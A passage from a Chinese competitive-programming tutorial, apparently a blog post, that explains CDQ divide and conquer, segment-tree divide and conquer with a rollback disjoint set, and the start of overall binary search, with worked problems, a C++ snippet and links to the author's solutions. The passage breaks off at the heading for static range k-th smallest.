<p><strong>数据范围</strong>：<span class="math inline">\(n \le 10^5, 1 \le a_i, b_i, c_i \le 10^9\)</span>。</p>
<hr />
<p>首先，如果是二维偏序问题的话（即假设每个元素只有 <span class="math inline">\(a, b\)</span> 两维），我们可以很容易想到一个解法：首先将所有元素按照 <span class="math inline">\(a\)</span> 维从小到大排序，然后将 <span class="math inline">\(b\)</span> 维离散化，按值扔进一个树状数组双指针统计一下就好了（即从小到大遍历 <span class="math inline">\(a\)</span>，然后在树状数组中 <span class="math inline">\(b\)</span> 的位置 <span class="math inline">\(+1\)</span>，每次都统计一下当前树状数组中小于当前 <span class="math inline">\(a\)</span> 的前缀和即可）。理论上三维偏序我们可以用一个二维树状数组解决，然而空间开不下，这可怎么办呢……</p>
<p>我们还是先将所有元素按照 <span class="math inline">\(a\)</span> 维从小到大进行排序，接下来考虑这样一个算法：</p>
<p><span class="math inline">\(solve(l, r)\)</span>：<span class="math inline">\(\forall k \in [l, r]\)</span>，计算第 <span class="math inline">\([l, k - 1]\)</span> 项元素对第 <span class="math inline">\(k\)</span> 项元素的贡献（与此同时对所有三元组按照 <span class="math inline">\(b\)</span> 维排序）：</p>
<ul>
<li><span class="math inline">\(mid = \frac{1}{2}(l + r)\)</span>；</li>
<li><span class="math inline">\(solve(l, mid)\)</span>；</li>
<li><span class="math inline">\(solve(mid + 1, r)\)</span>；</li>
<li><strong>计算 <span class="math inline">\([l, mid]\)</span> 中元素对 <span class="math inline">\([mid + 1, r]\)</span> 中每个元素造成的贡献</strong>，同时双指针合并两个左右有序区间：<span class="math inline">\(merge(l, mid + 1, r + 1)\)</span>。</li>
</ul>
<hr />
<p>接下来我们简要谈谈为什么这一算法是正确的。对于第 <span class="math inline">\(k\)</span> 项元素而言（作为偏序对中较大的元素）：</p>
<ul>
<li>若 <span class="math inline">\(k \le mid\)</span>，则 <span class="math inline">\(solve(l, mid)\)</span> 已经计算它所能与第 <span class="math inline">\([l, k - 1]\)</span> 项元素构成的偏序对数量；</li>
<li>若 <span class="math inline">\(k &gt; mid\)</span>，则 <span class="math inline">\(solve(mid + 1, r)\)</span> 已经计算了其所能与第 <span class="math inline">\([mid + 1, k - 1]\)</span> 项元素构成的偏序对数量；最后一步则计算了其可与第 <span class="math inline">\([l, mid]\)</span> 项元素构成的偏序对数量。两者相加后即为其与第 <span class="math inline">\([l, k - 1]\)</span> 项元素可构成的偏序对数量。</li>
<li>Voilà!</li>
</ul>
<hr />
<p>那么接下来我们需要仔细探讨一下上述算法中第 <span class="math inline">\(4\)</span> 步应当如何进行。不难发现在这一步时有两个重要特性：</p>
<ul>
<li>左区间中所有元素 <span class="math inline">\(a\)</span> 维一定小于右区间中所有元素 <span class="math inline">\(a\)</span> 维；</li>
<li>左右区间都已经按 <span class="math inline">\(b\)</span> 维排好序了。</li>
</ul>
<p>显然，这意味着我们不用去管 <span class="math inline">\(a\)</span> 维了，因为只要两个元素一个来自于左区间而另一个来自右区间，那么它们在 <span class="math inline">\(a\)</span> 维上肯定是满足偏序对要求的。那么…… <span class="math inline">\(b\)</span> 维已经排好序了，<span class="math inline">\(c\)</span> 维…… 等等，这不就是个二维偏序问题吗？所以我们只需要采用之前对二维偏序的做法对其进行处理就完事了~ 不难发现，采用了分治思想后，我们成功地将原问题的维度降低了一维。</p>
<hr />
<p>接下来我们简单分析一下复杂度：记当前分治区间长度为 <span class="math inline">\(n\)</span>，且第 <span class="math inline">\(4\)</span> 步处理所需复杂度为 <span class="math inline">\(\mathcal{O}(f(n))\)</span>（比如在上例中就是树状数组的复杂度即 <span class="math inline">\(\mathcal{O}(\log{n})\)</span>，则有：</p>
<p><span class="math display">\[
T(n) = 2T(\frac{n}{2}) + \mathcal{O}(f(n))
\]</span></p>
<p>借助主定理解一下（或者画递归树看一看）不难得到：</p>
<p><span class="math display">\[
T(n) \le \mathcal{O}(f(n) \log{n})
\]</span></p>
<p>通过复杂度计算我们也得到一条重要注意事项：我们必须保证在执行第 <span class="math inline">\(4\)</span> 步的时候复杂度与当前分治区间长度相关而不可以与整个区间长度相关，否则复杂度就不是上面这个样子了。在之前提到的具体问题中，就是清空树状数组的时候不能直接 <code>memset</code>，而必须逐一删除被修改了的部分，这样才能保证复杂度正确。</p>
<hr />
<p>下面简要上一段代码以供参考：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb1-1"><a href="#cb1-1"></a><span class="dt">void</span> divideConquer(<span class="dt">int</span> headPt, <span class="dt">int</span> tailPt) {</span>
<span id="cb1-2"><a href="#cb1-2"></a>    <span class="cf">if</span> (headPt == tailPt)</span>
<span id="cb1-3"><a href="#cb1-3"></a>        <span class="cf">return</span>;</span>
<span id="cb1-4"><a href="#cb1-4"></a>    <span class="dt">int</span> midPt = (headPt + tailPt) &gt;&gt; <span class="dv">1</span>;</span>
<span id="cb1-5"><a href="#cb1-5"></a>    divideConquer(headPt, midPt); divideConquer(midPt + <span class="dv">1</span>, tailPt);</span>
<span id="cb1-6"><a href="#cb1-6"></a>    <span class="dt">int</span> j = headPt; <span class="co">// j: 左区间中指针；i: 右区间中指针</span></span>
<span id="cb1-7"><a href="#cb1-7"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = midPt + <span class="dv">1</span>; i &lt;= tailPt; i++) {</span>
<span id="cb1-8"><a href="#cb1-8"></a>        <span class="cf">for</span> (; j &lt;= midPt &amp;&amp; arr[j].b &lt; arr[i].b; j++) </span>
<span id="cb1-9"><a href="#cb1-9"></a>            add(arr[j].c, <span class="dv">1</span>);</span>
<span id="cb1-10"><a href="#cb1-10"></a>        <span class="co">// 统计总三维偏序对数量（树状数组中 c 维小于当前的数量）</span></span>
<span id="cb1-11"><a href="#cb1-11"></a>        ans += prefixSum(arr[i].c - <span class="dv">1</span>);</span>
<span id="cb1-12"><a href="#cb1-12"></a>    }</span>
<span id="cb1-13"><a href="#cb1-13"></a>    <span class="co">// 撤销对树状数组的更改</span></span>
<span id="cb1-14"><a href="#cb1-14"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = headPt; i &lt; j; i++)</span>
<span id="cb1-15"><a href="#cb1-15"></a>        add(arr[i].c, -<span class="dv">1</span>);</span>
<span id="cb1-16"><a href="#cb1-16"></a>    <span class="co">// 按 b 维合并左右有序区间（cmpSnd 为按照 b 维从小到大排序的比较函数）</span></span>
<span id="cb1-17"><a href="#cb1-17"></a>    inplace_merge(arr + headPt, arr + midPt + <span class="dv">1</span>, arr + tailPt + <span class="dv">1</span>, cmpSnd);</span>
<span id="cb1-18"><a href="#cb1-18"></a>}</span></code></pre></div>
<hr />
<p>接下来，我们再来仔细考虑一下之前为了方便引入的限制。如果不满足不同元素间同一维上的值互不相同会引入什么问题？</p>
<p>问题依然是出在第 <span class="math inline">\(4\)</span> 步。在这一步时，我们只能保证左区间 <span class="math inline">\(a\)</span> 维<strong>小于等于</strong>右区间，而不能保证<strong>严格小于</strong>。换言之，在对 <span class="math inline">\(b\)</span> 维进行分治时，可能出现对于右区间某元素，左区间中存在某个元素使得两者 <span class="math inline">\(a\)</span> 维相等。读者可以先自行思考一下如何解决这一问题~</p>
<p>这里提供一种解决方法以供参考：先将 <span class="math inline">\(a\)</span> 维离散化，在双指针处理时开一个数组来记录某个 <span class="math inline">\(a\)</span> 维值对应的左区间中的元素的个数，在统计时减掉 <span class="math inline">\(a\)</span> 维相等的情况。</p>
<p>最后，大家可以去尝试一下一道模板题（注意这道题与前面举的例子不完全一样）： <a href="https://www.luogu.com.cn/problem/P3810">洛谷 P3810: 陌上花开</a>。顺便附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/Luogu/P3810/divide_and_conquer.cpp">我的代码</a> 以供参考。</p>
</div>
<div id="四维偏序" class="section level4">
<h4>四维偏序？</h4>
<p>既然三维偏序可以借助分治降成二维偏序，那么四维偏序何尝不可以借助分治降为三维偏序，然后再借助一层分治降成二维偏序呢？（不过 <span class="math inline">\(\mathcal{O}(n\log^3{n})\)</span> 这个复杂度也是挺尴尬的……</p>
<p>如果您已经跃跃欲试，不妨去 <a href="http://cogs.pro:8080/cogs/problem/problem.php?pid=vmXQmVqWP">COGS 2479:【HZOI 2016】偏序</a> 当场表演一波（逃……</p>
<p>不过当我们在对 <span class="math inline">\(c\)</span> 维进行分治（即三维偏序降为二维偏序）时只能保证任意左区间元素 <span class="math inline">\(p_i\)</span> 和任意右区间元素 <span class="math inline">\(p_j\)</span> 之间满足 <span class="math inline">\(b_i \le b_j\)</span>，而并不能保证 <span class="math inline">\(a_i \le a_j\)</span>。因此：</p>
<ul>
<li>对 <span class="math inline">\(b\)</span> 维进行分治时，合并左右区间前应标记此时元素属于哪个区间，且合并后应当备份这一区间；</li>
<li>对 <span class="math inline">\(c\)</span> 维进行分治时计算两层分治都在左区间的元素对两层分治都在右区间的元素的贡献，完成后应将区间从备份恢复以继续 <span class="math inline">\(b\)</span> 维上的分治。</li>
</ul>
<p>具体的实现可以参考一下 <a href="https://github.com/codgician/Competitive-Programming/blob/master/COGS/2479/divide_and_conquer_2d.cpp">我的代码</a>。</p>
</div>
<div id="十维偏序" class="section level4">
<h4>十维偏序？</h4>
<p>在 <span class="math inline">\(10^5\)</span> 的这个数据范围下，<span class="math inline">\(\mathcal{O}(n^2)\)</span> 不香吗（逃……</p>
</div>
</div>
<div id="动态数据结构问题" class="section level3">
<h3>动态数据结构问题？</h3>
<p>接下来我们讨论这个思想怎么跟动态数据结构问题扯上联系。</p>
<p>我们来考虑一下动态数据结构问题中回答查询的本质：即计算初始数据和本次查询之前，所有修改对该查询造成的影响。那么我们能不能借助分治思想使得修改和查询不要混在一起呢？</p>
<p><span class="math inline">\(solve(l, r)\)</span>：<span class="math inline">\(\forall k \in [l, r]\)</span>，若第 <span class="math inline">\(k\)</span> 项操作是查询，则计算 <span class="math inline">\([l, k - 1]\)</span> 中修改对其造成的影响：</p>
<ul>
<li><span class="math inline">\(mid = \frac{1}{2}(l + r)\)</span>；</li>
<li><span class="math inline">\(solve(l, mid)\)</span>；</li>
<li><span class="math inline">\(solve(mid + 1, r)\)</span>；</li>
<li>计算第 <span class="math inline">\([l, mid]\)</span> 项操作中所有修改对 <span class="math inline">\([mid + 1, r]\)</span> 中所有查询造成的影响。</li>
</ul>
<p>这样一来，我们便将 “计算操作集区间 <span class="math inline">\([l, r]\)</span> 内所有查询” 这一问题转换为了 “计算左区间中所有修改对右区间中所有查询造成影响”。换言之，以 <span class="math inline">\(\mathcal{O}(\log{n})\)</span> 的代价，我们成功地将一个动态问题转换成了静态问题。</p>
<hr />
<p>我们仿照之前来对这一算法的正确性进行分析（同时也可以看出运用这一思想对原问题的一些要求）。设第 <span class="math inline">\(k\)</span> 项操作是查询，则：</p>
<ul>
<li>若 <span class="math inline">\(k \le mid\)</span>，则 <span class="math inline">\(solve(l, mid)\)</span> 已经计算了第 <span class="math inline">\([l, k - 1]\)</span> 项操作中所有修改对当前查询的影响；</li>
<li>若 <span class="math inline">\(k &gt; mid\)</span>，则 <span class="math inline">\(solve(mid + 1, r)\)</span> 已经计算了第 <span class="math inline">\([mid + 1, k − 1]\)</span> 项操作中所有修改对当前查询操作的影响。只要这一影响满足可加性且满足交换律，并且不同修改操作造成的影响互相独立，直接加上最后一项计算就可以得到第 <span class="math inline">\([l, k − 1]\)</span> 项操作中所有修改对当前查询的影响。</li>
</ul>
<p>那么接下来我们就来看几个例子吧。</p>
<div id="动态二维数点" class="section level4">
<h4>动态二维数点</h4>
<p>给定二维平面上 <span class="math inline">\(n\)</span> 个点且有 <span class="math inline">\(q\)</span> 次操作。需要支持两种操作：</p>
<ul>
<li>添加一个新坐标点；</li>
<li>删除一个已有的坐标点；</li>
</ul>
<p>每次询问一个矩形区域 <span class="math inline">\((x_L, y_L), \ (x_R, y_R)\)</span> 内点的数量（左下和右上顶点坐标）。</p>
<p><strong>数据范围</strong>：<span class="math inline">\(n \le 10^5, \ q \le 10^5\)</span>。</p>
<hr />
<p>为了方便说明，我们先引入一些标记：</p>
<ul>
<li>记 <span class="math inline">\(a(x, y)\)</span> 代表 <span class="math inline">\((x, y)\)</span> 位置上点的个数；</li>
<li>记 <span class="math inline">\(Q(x_L, y_L, x_R, y_R)\)</span> 代表矩形区域 <span class="math inline">\((x_L, y_L), \ (x_R, y_R)\)</span> 内点的数量；</li>
<li>记 <span class="math inline">\(F(x, y)\)</span> 代表矩形区域 <span class="math inline">\((1, 1), (x, y)\)</span> 内点的数量（即二维前缀和）。</li>
</ul>
<p>那么显然，我们可以得到：</p>
<p><span class="math display">\[
Q(x_L, y_L, x_R, y_R) = \sum\limits_{i = x_L}^{x_R}\sum\limits_{j = y_L}^{y_R} a(i, j)
\]</span></p>
<p>借助一点点容斥原理，我们也可以推出：</p>
<p><span class="math display">\[
\begin{aligned}
Q(x_L, y_L, x_R, y_R) = &amp; F(x_R, y_R) + F(x_L − 1, y_L − 1) \\
&amp; − F(x_L − 1, y_R) − F(x_R, y_L − 1)
\end{aligned}
\]</span></p>
<p>那么现在问题就转换为求解 <span class="math inline">\(F(x, y)\)</span> 了。为什么要做这一转换？因为通过之前的了解我们也发现分治思想能够很好解决两者之间的大小关系，而很难解决三者之间的大小关系。转换为前缀和后我们处理的便是两者间的大小关系了（💡 其实第三维是没有必要拆分的，这里只是为了方便说明所以一起拆了。大家可以想想为什么 😝）。</p>
<p>另外既然要支持修改，那么意味着操作之间的顺序不能变。这等价于引入了时间维度 <span class="math inline">\(t\)</span>，越早出现的操作 <span class="math inline">\(t\)</span> 越小。这样问题便被转换为，若 <span class="math inline">\(P_i: \langle t_i, x_i, y_i \rangle\)</span> 是查询，则需计算所有满足以下条件修改的影响之和：</p>
<ul>
<li><span class="math inline">\(t_j &lt; t_i\)</span></li>
<li><span class="math inline">\(x_j \le x_i, \ y_j \le y_i\)</span></li>
</ul>
<p>Umm… 这不就成一个三维偏序问题了吗？接下来我们会介绍这一模型的一种经典应用。</p>
</div>
<div id="动态区间不同值" class="section level4">
<h4>动态区间不同值</h4>
<p>给定一个长度为 <span class="math inline">\(n\)</span> 的序列，共 <span class="math inline">\(q\)</span> 次操作。需要支持两种操作：</p>
<ul>
<li>把位置 <span class="math inline">\(i\)</span> 上的数修改为 <span class="math inline">\(v\)</span>（从 <span class="math inline">\(1\)</span> 开始编号）；</li>
<li>查询区间 <span class="math inline">\([L, R]\)</span> 内不同的数有多少种。</li>
</ul>
<p><strong>数据范围</strong>：<span class="math inline">\(n \le 10^5, \ q \le 10^5\)</span>。</p>
<p><strong>题目链接</strong>： <a href="https://www.luogu.com.cn/problemnew/show/P1903">Luogu P1903: 数颜色</a></p>
<hr />
<p>下面给出一点提示：</p>
<ul>
<li>记 <span class="math inline">\(pre(i)\)</span> 代表在位置 <span class="math inline">\(i\)</span> 左边与它最近的数值相同的数的位置；</li>
<li>对于每次查询只计算满足 <span class="math inline">\(pre(𝑖) &lt; L\)</span> 的位置个数；</li>
<li><span class="math inline">\(\langle l, 0 \rangle \le \langle i, pre(i) \rangle \le \rangle r, l - 1 \rangle\)</span>。</li>
</ul>
<p>至此我们成功得到了一个二维数点问题。</p>
<p>不过最后还有一点问题，每次修改会影响 <span class="math inline">\(pre\)</span> 值。不过我们发现每次修改至多影响 <span class="math inline">\(3\)</span> 个位置的 <span class="math inline">\(pre\)</span> 值（假设修改位置 <span class="math inline">\(i\)</span>，那么 <span class="math inline">\(pre(i)\)</span>、原先值的后继 和 新值前驱的后继会改变），那么按值开 <span class="math inline">\(n\)</span> 个 <code>std::set</code> 维护即可。</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/Luogu/P1903/divide_and_conquer.cpp">我的代码</a> 以供参考。</p>
</div>
<div id="动态曼哈顿最近点对" class="section level4">
<h4>动态曼哈顿最近点对</h4>
<p>二维平面上，有 <span class="math inline">\(q\)</span> 种操作。需要支持三种操作：</p>
<ul>
<li>添加一个新坐标点 <span class="math inline">\((x, y)\)</span>；</li>
<li>删除一个已有的坐标点 <span class="math inline">\((x, y)\)</span>；</li>
<li>查询距离 <span class="math inline">\((x_A, y_A)\)</span> 曼哈顿距离最接近的点。</li>
</ul>
<p><strong>数据范围</strong>：均为 <span class="math inline">\(10^5\)</span> 数量级。</p>
<p><strong>题目链接</strong>： <a href="https://www.luogu.com.cn/problem/P4169">洛谷 P4169: 天使玩偶</a></p>
<hr />
<p><span class="math inline">\(A, B\)</span> 两点之间的曼哈顿距离：</p>
<p><span class="math display">\[
dist(A, B) = |x_A - x_B| + |y_A - y_B|
\]</span></p>
<p>首先看着这个绝对值符号就很不爽，我们需要考虑将绝对值符号去除掉。我们不妨对所有情况进行讨论试一试：</p>
<p><span class="math display">\[
\begin{cases}
(x_A + y_A) - (x_B + y_B) &amp; x_A \ge x_B, \ y_A \ge y_B \\
(x_A - y_A) - (x_B - y_B) &amp; x_A \ge x_B, \ y_A &lt; y_B \\
(-x_A + y_A) - (-x_B + y_B) &amp; x_A &lt; x_B, \ y_A \ge y_B \\
(-x_A - y_A) - (-x_B - y_B) &amp; x_A &lt; x_B, \ y_A &lt; y_B
\end{cases}
\]</span></p>
<p>不难发现对于每一次询问 <span class="math inline">\((x_A, y_A)\)</span> 而言，上面四个式子前半部分都是定值。既然要最小化结果，那么我们只要让后半部分最小就好了。换言之，我们只需要对这四种情况都分别跑一次 CDQ 分治并且取最小答案就好了。不过，在实现的时候还有一个小技巧。我们还可以对上面的四种情况进行进一步整理：</p>
<p><span class="math display">\[
\begin{cases}
(x_A + y_A) - (x_B + y_B) &amp; x_A \ge x_B, \ y_A \ge y_B \\
(x_A + (\infty - y_A)) - (x_B + (\infty - y_B)) &amp; x_A \ge x_B, \ (\infty - y_A) &gt; (\infty - y_B) \\
((\infty - x_A) + y_A) - ((\infty - x_B) + y_B) &amp; (\infty - x_A) &gt; (t - x_B), \ y_A \ge y_B \\
((\infty - x_A) + (\infty - y_A)) - ((\infty - x_B) + (\infty - y_B)) &amp; (\infty - x_A) &gt; (\infty - x_B), \ (\infty - y_A) &gt; (\infty - y_B)
\end{cases}
\]</span></p>
<p>需要注意的是，由于本题是取最大值，因此把上面式子中的 <span class="math inline">\(&gt;\)</span> 换成 <span class="math inline">\(\ge\)</span> 是不影响答案的；而如果是要计数的话则需要留意这一细节。</p>
<p>不难发现，我们成功地把四个式子都转换成了如下的形式：</p>
<p><span class="math display">\[
x_A&#39; + y_A&#39; - (x_B&#39; + y_B&#39;) \quad x_A&#39; \ge x_B&#39;, \ y_A&#39; \ge y_B&#39;
\]</span></p>
<p>这样一来，我们只需要考虑这样一种情况就好了，我们只需要改变一下 <span class="math inline">\(x_A&#39;, y_A&#39;, x_B&#39;, y_B&#39;\)</span> 的值跑四遍一种情况即可，这样极大方便了代码编写。</p>
<p>也就是说，现在问题转化成了需要支持下面两种操作：</p>
<ul>
<li>插入新点 <span class="math inline">\((x, y)\)</span>；</li>
<li>给定点 <span class="math inline">\((x_A, y_A)\)</span>，询问满足以下条件的 <span class="math inline">\((x_B, y_B)\)</span>：
<ul>
<li><span class="math inline">\(x_A \ge x_B, \ y_A \ge y_B\)</span>；</li>
<li><span class="math inline">\(x_B + y_B\)</span> 取值最大。</li>
</ul></li>
</ul>
<p>可以看出，这依然是个三维偏序问题的变种。至于维护最大值，我们其实需要维护的只是前缀最大值，魔改一下树状数组就好了。</p>
</div>
</div>
<div id="优化动态规划" class="section level3">
<h3>优化动态规划</h3>
<div id="三维-lis" class="section level4">
<h4>三维 LIS</h4>
<p>给定长为 <span class="math inline">\(n\)</span> 的三元组序列 <span class="math inline">\(p_i = \langle a_i, b_i, c_i \rangle\)</span>，求其最长的上升子序列。</p>
<p><strong>数据范围</strong>：<span class="math inline">\(n \le 10^5, a_i, b_i, c_i \le 2^{30}\)</span></p>
<p><strong>题目链接</strong>：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=4742">HDUOJ 4742: Pinball Game 3D</a></p>
<hr />
<p>借助分治对 <span class="math inline">\(dp(i)\)</span> 进行更新就行了~</p>
<p>首先，LIS 的 DP 方程式很好写出：</p>
<p>我们记 <span class="math inline">\(dp(i)\)</span> 代表前 <span class="math inline">\(i\)</span> 个元素所能构成的 LIS 长度，那么对于能够使得 <span class="math inline">\(\langle i, j \rangle\)</span> 构成偏序对的 <span class="math inline">\(j\)</span>，我们可以用如下转移方程来更新答案：</p>
<p><span class="math display">\[
dp(i) = \max\limits_{j &lt; i}\{dp(j)\} + 1
\]</span></p>
<p>但是在 DP 时我们需要注意顺序问题，比如采用上面方程的话我们需要从左往右 DP，换言之在更新 <span class="math inline">\(dp(i)\)</span> 时，<span class="math inline">\(\forall j &lt; i\)</span>，其 <span class="math inline">\(dp(j)\)</span> 应当都已被计算完成。所以在进行分治的时候我们要 “中序” 进行，即先左区间递归，然后计算左右之间贡献，最后再右区间递归。由于双指针合并要求左右区间有序，因此左区间递归后还需对右区间进行排序，同时递归右区间前还需还原右区间的顺序。</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/HDUOJ/4742/divide_and_conquer.cpp">我的代码</a> 以供参考。</p>
</div>
</div>
<div id="小结" class="section level3">
<h3>小结</h3>
<p>通过上面的例题，我们大致领略了 CDQ 分治这一思想的几个神奇作用，即
以 <span class="math inline">\(\mathcal{O}(\log{n})\)</span> 复杂度的代价：</p>
<ul>
<li>将区间内的问题转化为两个有序区间之间的问题；</li>
<li>将高维的问题维度降低一维；</li>
<li>将动态数据结构问题转化成静态数据结构问题。</li>
</ul>
</div>
</div>
<div id="线段树分治" class="section level2">
<h2>线段树分治</h2>
<p>前面也提到了动态数据结构问题带有修改操作，而修改操作也可以被分为插入和删除两种。如果插入和删除都比较好实现的话，那么运用上面的 CDQ 分治就可以容易求解问题了。但是再有的题目里面，插入很好实现，但是删除却难以实现。比如并查集维护图的连通性时，添加边很容易，但是如果要删除边就会很复杂（因为并查集里面只维护了连通性而没有维护原图本身）。在这种时候，我们便可以考虑用线段树分治以 <span class="math inline">\(\mathcal{O}(\log{n})\)</span> 的代价把带有插入和删除的问题转化为只带插入的问题。</p>
<p>为了便于理解，我们直接上一道经典例题。</p>
<div id="动态二分图判定" class="section level3">
<h3>动态二分图判定</h3>
<p>给定一张 <span class="math inline">\(n\)</span> 个点的图，在 <span class="math inline">\(T\)</span> 时间内一些边会在 <span class="math inline">\(s_i\)</span> 时刻出现，并在 <span class="math inline">\(t_i\)</span> 时刻消失。询问每一个时刻该图是否是二分图。</p>
<p><strong>数据范围</strong>：均在 <span class="math inline">\(10^5\)</span> 级别。</p>
<p><strong>题目链接</strong>：<a href="https://www.lydsy.com/JudgeOnline/problem.php?id=4025">BZOJ 4025: 二分图</a> | <a href="https://darkbzoj.tk/problem/4025">如果挂了试试这个</a></p>
<hr />
<p>首先，判断是否构成二分图的本质即判断是否存在奇环。一张无向图不存在奇环是该图为二分图的充要条件。那么如何维护奇环信息？我们可以用带权的并查集解决，即在并查集中记录一个深度，如果在连边时两点深度加起来在加 <span class="math inline">\(1\)</span> 是奇数的话，就说明存在奇环了（大家可以想想为什么）。</p>
<p>现在问题来了，并查集中加边容易删边难，这可怎么办 QAQ。</p>
<p>首先，对于元素又有插入又有删除这一特性，说明每一个元素都有一个存活的时间区间（在这道题里面是直接把存活区间给出了）。对于更一般的情况，我们可以对于每一个元素预处理出时间区间，然后对时间区间进行分治。</p>
<p>假设一共有 <span class="math inline">\(q\)</span> 次询问（即 <span class="math inline">\(q\)</span> 个事件），考虑对完整时间区间 <span class="math inline">\([1, q]\)</span> 建一棵线段树，那么对于时间点的询问即询问这棵线段树的叶子节点上的状态；而对于边的修改则是对线段树上对应区间上的修改。这样问题就转换为对于一个时间区间加边和查询叶子节点，也就不存在删边这种操作了。而整个分治过程本质上就是对这一棵线段树做先序遍历。</p>
<hr />
<p><span class="math inline">\(solve(l, r, Q)\)</span>：对于时刻 <span class="math inline">\([l, r]\)</span>，操作集为 <span class="math inline">\(Q\)</span>，满足 <span class="math inline">\(\forall q \in Q\)</span>，其存活时间区间与当前分治的时间区间交集非空；而这个函数的作用为对于 <span class="math inline">\([l, r]\)</span> 内每个时刻，判断此时图是否是二分图。操作集 <span class="math inline">\(Q\)</span> 中元素 <span class="math inline">\(q\)</span> 带有 <span class="math inline">\(4\)</span> 个属性：<span class="math inline">\(\langle u, v, l, r \rangle\)</span>。其中，<span class="math inline">\(u, v\)</span> 代表边的两个端点，而 <span class="math inline">\(l, r\)</span> 代表出现和消失时刻。我们可以考虑如下算法：</p>
<ul>
<li><span class="math inline">\(mid = \frac{1}{2} (l + r)\)</span>，并新建两个空操作集 <span class="math inline">\(Q_L, Q_R\)</span>；</li>
<li>遍历 <span class="math inline">\(q \in Q\)</span>：
<ul>
<li>若 <span class="math inline">\(q.l = l \land q.r = r\)</span>（说明这一操作对其子树中所有叶子节点都有影响，那么直接加边）：
<ul>
<li>并查集中合并 <span class="math inline">\(q.u\)</span> 和 <span class="math inline">\(q.v\)</span>，并判断是否出现奇环；</li>
<li>存在奇环？说明时间区间 <span class="math inline">\([l, r]\)</span> 都凉了，均标记答案为否！<strong>撤销对并查集的操作并回溯</strong>（所以我们需要可撤销并查集，其实也很简单，就搞一个栈记录一下操作之前值的情况然后撤销的时候弹栈就好了）；</li>
</ul></li>
<li>若 <span class="math inline">\(q.l \le mid\)</span>：令 <span class="math inline">\(q.r = \min⁡(q.r, mid)\)</span>，并把 <span class="math inline">\(q\)</span> 放入 <span class="math inline">\(Q_L\)</span>；</li>
<li>若 <span class="math inline">\(q.r &gt; mid\)</span>：<span class="math inline">\(q.l = \max⁡(q.l, mid + 1)\)</span>，并把 <span class="math inline">\(q\)</span> 放入 <span class="math inline">\(Q_R\)</span>；</li>
</ul></li>
<li>若 <span class="math inline">\(l = r\)</span>，标记答案为是，<strong>撤销对并查集的操作并回溯</strong>；</li>
<li><span class="math inline">\(solve(l, mid, Q_L)\)</span>；</li>
<li><span class="math inline">\(solve(mid + 1, r, Q_R)\)</span>；</li>
<li><strong>撤销对并查集的操作并回溯</strong>。</li>
</ul>
<p>这样一来，我们就成功避免了删除操作，从而更容易地得以解决问题。大家可以结合演示文稿里面的图示以方便理解。</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/BZOJ/4025/divide_and_conquer_disjoint_set_heuristic.cpp">我的代码</a> 以供参考。我的写法实际上是没有建出线段树的，当然也有另外建出线段树的写法，大家也可以去了解一下。</p>
</div>
<div id="虚假的强制在线" class="section level3">
<h3>虚假的强制在线</h3>
<p>这一启发来自于 Codeforces 上一道有趣的题目。</p>
<p>给定一个初始无边的含有 <span class="math inline">\(n\)</span> 个点的无向图（标号从 <span class="math inline">\(1\)</span> 开始），共 <span class="math inline">\(q\)</span> 次操作。操作有两种形式（其中 <span class="math inline">\(last\)</span> 代表上一次 <span class="math inline">\(2\)</span> 类操作的结果）：</p>
<ul>
<li><span class="math inline">\(1 \ x \ y \ (1 \le x, y \le n, \ x \neq y)\)</span>：在点 <span class="math inline">\((x + last - 1) \bmod (n + 1)\)</span> 和点 <span class="math inline">\((y + last - 1) \bmod (n + 1)\)</span> 间添加一条无向边；</li>
<li><span class="math inline">\(2 \ x \ y \ (1 \le x, y \le n, \ x \neq y)\)</span>：查询点 <span class="math inline">\((x + last - 1) \bmod (n + 1)\)</span> 和点 <span class="math inline">\((y + last - 1) \bmod (n + 1)\)</span> 是否连通。</li>
</ul>
<p><strong>数据范围</strong>：<span class="math inline">\(2 \le n, q \le 10^5\)</span></p>
<p><strong>题目链接</strong>：<a href="https://codeforces.com/contest/1217/problem/F">Codeforces 1217F: Forced Online Queries Problem</a></p>
<hr />
<p>虽说这道题看起来强制在线了，但是 <span class="math inline">\(last \in [0, 1]\)</span>，其实可能的操作种数顶多就 <span class="math inline">\(2q\)</span> 个。因此我们不妨考虑把所有操作都加入线段树分治，然后处理的时候只选取有效的那个处理。</p>
<p>但是怎么判这个有效呢？我们是不是只有在执行完其之前最接近的 <span class="math inline">\(2\)</span> 类操作才能知道当前操作哪一个有效。换言之，只要在分治过程中能保证在处理每一条边前在其前面的 <span class="math inline">\(2\)</span> 类操作已经被处理过就行了。由于查询都在叶子上，所以我们单独开一个数组记录第 <span class="math inline">\(i\)</span> 时刻的查询是什么（即直接记录在线段树的叶子上）。</p>
<p>我们可以施加一点小技巧。原本边的出现时间是区间 <span class="math inline">\((s, t)\)</span>，我们现在把它改成 <span class="math inline">\((s + 1, t)\)</span>。这一修改导致的结果非常微妙：首先，在 <span class="math inline">\(s\)</span> 时刻的操作其实是加边，不会同时进行查询，因此这一修改不会影响答案；其次，这样的修改保证了我们在把这一条边加入并查集是，<span class="math inline">\(s\)</span> 时刻对应的叶子节点一定是被遍历过的，即我们已经知道了 <span class="math inline">\(last\)</span> 确切的值，因此我们就可以判断出哪些操作是有效的了。</p>
<p>详细的实现大家可以参考一下 <a href="https://github.com/codgician/Competitive-Programming/blob/master/Codeforces/1217F/divide_and_conquer_disjoint_set_heuristic.cpp">我的代码</a>。</p>
</div>
</div>
</div>
<div id="基于数值的离线分治" class="section level1">
<h1>基于数值的离线分治</h1>
<div id="整体二分" class="section level2">
<h2>整体二分</h2>
<p>大家对于二分算法大概是非常熟悉的，但是我们接触到的传统的二分往往是针对单个询问进行二分。而整体二分则更进一步，对多个同类操作（包括修改和查询）一起二分答案，同时依据当前二分的判定值对当前操作集进行分类，再应用分治思想分而治之。而这一算法的经典应用即为区间第 <span class="math inline">\(k\)</span> 小。我们不妨以其作为例子来介绍整体二分。</p>
<div id="静态区间第-k-小" class="section level3">
<h3>静态区间第 <span class="math inline">\(k\)</span> 小</h3>
